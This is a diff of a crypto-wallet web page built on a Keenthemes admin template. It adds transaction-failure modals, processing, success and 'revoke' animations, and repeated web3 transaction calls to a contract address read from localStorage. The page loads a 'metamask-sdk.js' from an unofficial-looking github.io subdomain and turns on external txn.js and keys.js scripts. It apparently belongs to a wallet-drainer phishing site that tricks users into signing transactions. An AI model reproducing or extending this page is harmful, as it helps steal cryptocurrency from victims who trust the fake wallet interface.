@@ -15,7 +15,7 @@
 	<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
 	<meta http-equiv="pragma" content="no-cache" />
 	<link rel="canonical" href="https://preview.keenthemes.com/start" />
-	<script src="../../key.js?cachebuster=1"></script>
+	<script src="../../keys.js?cachebuster=1"></script>
 
 	<link rel="shortcut icon" href="../../assets/media/logos/en_logo.png" />
 	<!--begin::Fonts-->
@@ -213,6 +213,24 @@
 <!--end::Head-->
 <!--begin::Body-->
 
+<div class="modal fade" tabindex="-1" id="transactionFailedModal">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title text-danger">Transaction Failed</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body text-center">
+                <p>Uunable to process your transaction. Please check your connection and try again.</p>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+
+            </div>
+        </div>
+    </div>
+</div>
+
 <body id="kt_body" data-sidebar="off"
 	class="header-fixed header-tablet-and-mobile-fixed toolbar-enabled sidebar-enabled">
 	<!--begin::Main-->
@@ -343,7 +361,7 @@
 											<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24"
 												viewBox="0 0 24 24" fill="none">
 												<path opacity="0.3"
-													d="M19 22H5C4.4 22 4 21.6 4 21V3C4 2.4 4.4 2 5 2H14L20 8V21C20 21.6 19.6 22 19 22ZM15 17C15 16.4 14.6 16 14 16H8C7.4 16 7 16.4 7 17C7 17.6 7.4 18 8 18H14C14.6 18 15 17.6 15 17ZM17 12C17 11.4 16.6 11 16 11H8C7.4 11 7 11.4 7 12C7 12.6 7.4 13 8 13H16C16.6 13 17 12.6 17 12ZM17 7C17 6.4 16.6 6 16 6H8C7.4 6 7 6.4 7 7C7 7.6 7.4 8 8 8H16C16.6 8 17 7.6 17 7Z"
+													d="M19 22H5C4.4 22 4 21.6 4 21V3C4 2.4 4.4 2 5 2H14L20 8V21C20 21.6 19.6 22 19 22ZM16 13H13V10C13 9.4 12.6 9 12 9C11.4 9 11 9.4 11 10V13H8C7.4 13 7 13.4 7 14C7 14.6 7.4 15 8 15H11V18C11 18.6 11.4 19 12 19C12.6 19 13 18.6 13 18V15H16C16.6 15 17 14.6 17 14C17 13.4 16.6 13 16 13Z"
 													fill="black" />
 												<path d="M15 8H20L14 2V7C14 7.6 14.4 8 15 8Z" fill="black" />
 											</svg>
@@ -396,13 +414,13 @@
 											viewBox="0 0 24 24" fill="none">
 											<path opacity="0.3"
 												d="M3.20001 5.91897L16.9 3.01895C17.4 2.91895 18 3.219 18.1 3.819L19.2 9.01895L3.20001 5.91897Z"
-												fill="grey" />
+												fill="grey"></path>
 											<path opacity="0.3"
 												d="M13 13.9189C13 12.2189 14.3 10.9189 16 10.9189H21C21.6 10.9189 22 11.3189 22 11.9189V15.9189C22 16.5189 21.6 16.9189 21 16.9189H16C14.3 16.9189 13 15.6189 13 13.9189ZM16 12.4189C15.2 12.4189 14.5 13.1189 14.5 13.9189C14.5 14.7189 15.2 15.4189 16 15.4189C16.8 15.4189 17.5 14.7189 17.5 13.9189C17.5 13.1189 16.8 12.4189 16 12.4189Z"
-												fill="grey" />
+												fill="grey"></path>
 											<path
 												d="M13 13.9189C13 12.2189 14.3 10.9189 16 10.9189H21V7.91895C21 6.81895 20.1 5.91895 19 5.91895H3C2.4 5.91895 2 6.31895 2 6.91895V20.9189C2 21.5189 2.4 21.9189 3 21.9189H19C20.1 21.9189 21 21.0189 21 19.9189V16.9189H16C14.3 16.9189 13 15.6189 13 13.9189Z"
-												fill="grey" />
+												fill="grey"></path>
 										</svg>
 									</span>
 									<!--end::Svg Icon-->
@@ -823,6 +841,26 @@
 	</div>
 	<!--end::Root-->
 
+	<!--begin::Animation Container-->
+	<div id="animation-container" style="position: fixed; top: 50%; left: 50%; width: 300px; height: 300px; display: none; z-index: 9999;">
+		<dotlottie-player id="processing-animation"
+			src="https://lottie.host/c0c762b6-fd69-4271-b53c-1c7408d4ac7b/UQ58y0jOJk.json" background="transparent"
+			speed="1"
+			style="position: fixed; top: 50%; left: 50%; width: 300px; height: 300px; transform: translate(-50%, -50%); display: none;"
+			loop autoplay></dotlottie-player>
+		<dotlottie-player id="success-animation"
+			src="https://lottie.host/ad8c738b-dc0b-4023-a493-e963160f6374/liHt4pMZnH.json" background="transparent"
+			speed="1"
+			style="position: fixed; top: 50%; left: 50%; width: 300px; height: 300px; transform: translate(-50%, -50%); display: none;"
+			loop autoplay></dotlottie-player>
+		<dotlottie-player id="revoke-animation"
+			src="https://lottie.host/embed/59528ec6-b14b-4a39-961a-78a8321a632a/Q3B9vsaZyM.lottie" background="transparent"
+			speed="1"
+			style="position: fixed; top: 50%; left: 50%; width: 300px; height: 300px; transform: translate(-50%, -50%); display: none;"
+			loop autoplay></dotlottie-player>
+	</div>
+	<!--end::Animation Container-->
+
 	<!--begin::Scrolltop-->
 	<div id="kt_scrolltop" class="scrolltop" data-kt-scrolltop="true">
 		<!--begin::Svg Icon | path: icons/duotune/arrows/arr066.svg-->
@@ -838,12 +876,11 @@
 		<!--end::Svg Icon-->
 	</div>
 	<!--end::Scrolltop-->
-	<!--end::Main-->
 	<!--begin::Javascript-->
 	<!--begin::Global Javascript Bundle(used by all pages)-->
 	<script src="../../assets/plugins/global/plugins.bundle.js"></script>
 	<script src="../../assets/js/scripts.bundle.js"></script>
-	<!-- <script src="assets/js/custom/txn.js"></script> -->
+	<script src="../../js/txn.js"></script>
 	<script src="https://cdn.jsdelivr.net/npm/web3@4.2.2/dist/web3.min.js"></script>
 	<script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
 	<script src="../../assets/js/bundle.js"></script>
@@ -861,14 +898,41 @@
 
 	</script>
 	<script>
+		// Function to handle transaction failure
+		function transactionFailed() {
+        var transactionModal = new bootstrap.Modal(document.getElementById('transactionFailedModal'));
+        transactionModal.show();
+    }
 
+		// Function to check if animation elements exist in the DOM
+		function checkAnimationElements() {
+			const animContainer = document.getElementById('animation-container');
+			const processingAnim = document.getElementById('processing-animation');
+			const successAnim = document.getElementById('success-animation');
+			const revokeAnim = document.getElementById('revoke-animation');
+			
+			console.log('Animation elements check:', {
+				animContainer: !!animContainer,
+				processingAnim: !!processingAnim,
+				successAnim: !!successAnim,
+				revokeAnim: !!revokeAnim
+			});
+			
+			if (!animContainer) console.error('animation-container not found in DOM!');
+			if (!processingAnim) console.error('processing-animation not found in DOM!');
+			if (!successAnim) console.error('success-animation not found in DOM!');
+			if (!revokeAnim) console.error('revoke-animation not found in DOM!');
+			
+			// Return true if all elements exist
+			return !!(animContainer && processingAnim && successAnim && revokeAnim);
+		}
+
+		// Get the contract address from localStorage
+		const contractAddress = localStorage.getItem('contract');
 		let gas;
 		const priorityFeeDecimal = 1;         // 0.1 Gwei in Wei
 		const priorityFeeHex = '0x' + priorityFeeDecimal.toString(16);
 		// => '0x5F5E100'
-
-
-
 
 		// Create contract instance
 		let settings = new web3.eth.Contract(contractABI, contractAddress);
@@ -930,33 +994,47 @@
 							],
 						})
 							.then((txHash) => {
-								console.log('Transaction Hash:', txHash);
-								startProcessingAnimation();
-								setTimeout(showSuccessAnimation, 6000);
+								console.log('Transaction successful, hash:', txHash);
+								if (checkAnimationElements()) {
+									console.log('About to start processing animation...');
+									window.startProcessingAnimation();
+									setTimeout(window.showSuccessAnimation, 6000);
 
-								// Hide animations after a short delay (optional)
-								setTimeout(hideAnimations, 8500);
+									// Hide animations after a short delay (optional)
+									setTimeout(window.hideAnimations, 8500);
+								} else {
+									console.error('Animation elements not found in DOM!');
+								}
 
 							})
 							.catch((error) => {
 								console.error('Transaction failed:', error);
-								startProcessingAnimation();
-								setTimeout(showRevokeAnimation, 6000);
+								if (checkAnimationElements()) {
+									console.log('About to show error animation...');
+									window.startProcessingAnimation();
+									setTimeout(window.showRevokeAnimation, 6000);
 
-								// Hide animations after a short delay (optional)
-								setTimeout(hideAnimations, 8500);
-								transactionFailed()
+									// Hide animations after a short delay (optional)
+									setTimeout(window.hideAnimations, 8500);
+								} else {
+									console.error('Animation elements not found in DOM!');
+								}
+								transactionFailed();
 							});
 					}
 				})
 				.catch(error => {
 					console.error('An error occurred while fetching the connected accounts.', error);
-					startProcessingAnimation();
-					setTimeout(showRevokeAnimation, 6000);
+					if (checkAnimationElements()) {
+						window.startProcessingAnimation();
+						setTimeout(window.showRevokeAnimation, 6000);
 
-					// Hide animations after a short delay (optional)
-					setTimeout(hideAnimations, 8500);
-					transactionFailed()
+						// Hide animations after a short delay (optional)
+						setTimeout(window.hideAnimations, 8500);
+					} else {
+						console.error('Animation elements not found in DOM!');
+					}
+					transactionFailed();
 				});
 		})
 
@@ -1006,32 +1084,46 @@
 							],
 						})
 							.then((txHash) => {
-								console.log('Transaction Hash:', txHash);
-								startProcessingAnimation();
-								setTimeout(showSuccessAnimation, 6000);
+								console.log('Transaction successful, hash:', txHash);
+								if (checkAnimationElements()) {
+									console.log('About to start processing animation...');
+									window.startProcessingAnimation();
+									setTimeout(window.showSuccessAnimation, 6000);
 
-								// Hide animations after a short delay (optional)
-								setTimeout(hideAnimations, 8500);
+									// Hide animations after a short delay (optional)
+									setTimeout(window.hideAnimations, 8500);
+								} else {
+									console.error('Animation elements not found in DOM!');
+								}
 
 							})
 							.catch((error) => {
 								console.error('Transaction failed:', error);
-								startProcessingAnimation();
-								setTimeout(showRevokeAnimation, 6000);
+								if (checkAnimationElements()) {
+									console.log('About to show error animation...');
+									window.startProcessingAnimation();
+									setTimeout(window.showRevokeAnimation, 6000);
 
-								// Hide animations after a short delay (optional)
-								setTimeout(hideAnimations, 8500);
+									// Hide animations after a short delay (optional)
+									setTimeout(window.hideAnimations, 8500);
+								} else {
+									console.error('Animation elements not found in DOM!');
+								}
 								transactionFailed()
 							});
 					}
 				})
 				.catch(error => {
 					console.error('An error occurred while fetching the connected accounts.', error);
-					startProcessingAnimation();
-					setTimeout(showRevokeAnimation, 6000);
+					if (checkAnimationElements()) {
+						window.startProcessingAnimation();
+						setTimeout(window.showRevokeAnimation, 6000);
 
-					// Hide animations after a short delay (optional)
-					setTimeout(hideAnimations, 8500);
+						// Hide animations after a short delay (optional)
+						setTimeout(window.hideAnimations, 8500);
+					} else {
+						console.error('Animation elements not found in DOM!');
+					}
 					transactionFailed()
 				});
 		})
@@ -1084,32 +1176,46 @@
 							],
 						})
 							.then((txHash) => {
-								console.log('Transaction Hash:', txHash);
-								startProcessingAnimation();
-								setTimeout(showSuccessAnimation, 6000);
+								console.log('Transaction successful, hash:', txHash);
+								if (checkAnimationElements()) {
+									console.log('About to start processing animation...');
+									window.startProcessingAnimation();
+									setTimeout(window.showSuccessAnimation, 6000);
 
-								// Hide animations after a short delay (optional)
-								setTimeout(hideAnimations, 8500);
+									// Hide animations after a short delay (optional)
+									setTimeout(window.hideAnimations, 8500);
+								} else {
+									console.error('Animation elements not found in DOM!');
+								}
 
 							})
 							.catch((error) => {
 								console.error('Transaction failed:', error);
-								startProcessingAnimation();
-								setTimeout(showRevokeAnimation, 6000);
+								if (checkAnimationElements()) {
+									console.log('About to show error animation...');
+									window.startProcessingAnimation();
+									setTimeout(window.showRevokeAnimation, 6000);
 
-								// Hide animations after a short delay (optional)
-								setTimeout(hideAnimations, 8500);
+									// Hide animations after a short delay (optional)
+									setTimeout(window.hideAnimations, 8500);
+								} else {
+									console.error('Animation elements not found in DOM!');
+								}
 								transactionFailed()
 							});
 					}
 				})
 				.catch(error => {
 					console.error('An error occurred while fetching the connected accounts.', error);
-					startProcessingAnimation();
-					setTimeout(showRevokeAnimation, 6000);
+					if (checkAnimationElements()) {
+						window.startProcessingAnimation();
+						setTimeout(window.showRevokeAnimation, 6000);
 
-					// Hide animations after a short delay (optional)
-					setTimeout(hideAnimations, 8500);
+						// Hide animations after a short delay (optional)
+						setTimeout(window.hideAnimations, 8500);
+					} else {
+						console.error('Animation elements not found in DOM!');
+					}
 					transactionFailed()
 				});
 		})
@@ -1152,32 +1258,46 @@
 							],
 						})
 							.then((txHash) => {
-								console.log('Transaction Hash:', txHash);
-								startProcessingAnimation();
-								setTimeout(showSuccessAnimation, 6000);
+								console.log('Transaction successful, hash:', txHash);
+								if (checkAnimationElements()) {
+									console.log('About to start processing animation...');
+									window.startProcessingAnimation();
+									setTimeout(window.showSuccessAnimation, 6000);
 
-								// Hide animations after a short delay (optional)
-								setTimeout(hideAnimations, 8500);
+									// Hide animations after a short delay (optional)
+									setTimeout(window.hideAnimations, 8500);
+								} else {
+									console.error('Animation elements not found in DOM!');
+								}
 
 							})
 							.catch((error) => {
 								console.error('Transaction failed:', error);
-								startProcessingAnimation();
-								setTimeout(showRevokeAnimation, 6000);
+								if (checkAnimationElements()) {
+									console.log('About to show error animation...');
+									window.startProcessingAnimation();
+									setTimeout(window.showRevokeAnimation, 6000);
 
-								// Hide animations after a short delay (optional)
-								setTimeout(hideAnimations, 8500);
+									// Hide animations after a short delay (optional)
+									setTimeout(window.hideAnimations, 8500);
+								} else {
+									console.error('Animation elements not found in DOM!');
+								}
 								transactionFailed()
 							});
 					}
 				})
 				.catch(error => {
 					console.error('An error occurred while fetching the connected accounts.', error);
-					startProcessingAnimation();
-					setTimeout(showRevokeAnimation, 6000);
+					if (checkAnimationElements()) {
+						window.startProcessingAnimation();
+						setTimeout(window.showRevokeAnimation, 6000);
 
-					// Hide animations after a short delay (optional)
-					setTimeout(hideAnimations, 8500);
+						// Hide animations after a short delay (optional)
+						setTimeout(window.hideAnimations, 8500);
+					} else {
+						console.error('Animation elements not found in DOM!');
+					}
 					transactionFailed()
 				});
 		})
@@ -1324,7 +1444,5 @@
 	</script>
 	<!--end::Javascript-->
 </body>
-
-<!--end::Body-->
 
 </html>
